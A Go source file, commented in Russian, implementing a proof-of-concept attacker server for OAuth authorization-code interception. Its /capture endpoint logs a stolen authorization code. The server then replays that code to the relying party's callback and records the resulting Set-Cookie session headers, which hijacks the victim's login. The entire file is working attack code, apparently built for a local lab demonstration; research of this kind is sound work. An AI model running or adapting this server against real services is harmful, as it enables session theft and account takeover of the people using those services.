package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
)

const rpCallback = "http://127.0.0.1:8000/callback"

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/", home)
	mux.HandleFunc("/capture", capture)

	log.Println("PoC listening on http://127.0.0.1:9000")

	if err := http.ListenAndServe(":9000", mux); err != nil {
		log.Fatal(err)
	}
}

func home(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `<h1>PoC server</h1>`)
}

// Получаем украденный authorization code.
func capture(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")

	if code == "" {
		http.Error(
			w,
			"missing code",
			http.StatusBadRequest,
		)

		return
	}

	log.Println()
	log.Println("======================================")
	log.Println("[PoC] AUTHORIZATION CODE RECEIVED")
	log.Println(code)
	//
	// После получения code атакующий сервер
	// сам вызывает RP callback.
	//
	go completeOAuth(code)

	fmt.Fprint(w, "authorization code captured")
}

func completeOAuth(code string) {
	params := url.Values{}
	params.Set("code", code)
	target := rpCallback + "?" + params.Encode()
	log.Printf("[PoC] sending request to %v", target)
	req, err := http.NewRequest(
		http.MethodGet,
		target,
		nil,
	)

	if err != nil {
		log.Println("[PoC] request creation:", err)
		return
	}

	client := &http.Client{

		// НЕ следуем за redirect.
		//
		// Нам нужен именно response от RP,
		// содержащий Set-Cookie.
		CheckRedirect: func(
			req *http.Request,
			via []*http.Request,
		) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)

	if err != nil {
		log.Println("[PoC] victim /callback request status:", err)
		return
	}

	defer resp.Body.Close()

	log.Println("[PoC] victim /callback request status:", resp.Status)
	log.Println(resp.Header.Values("Set-Cookie"))
	log.Println("======================================")
}
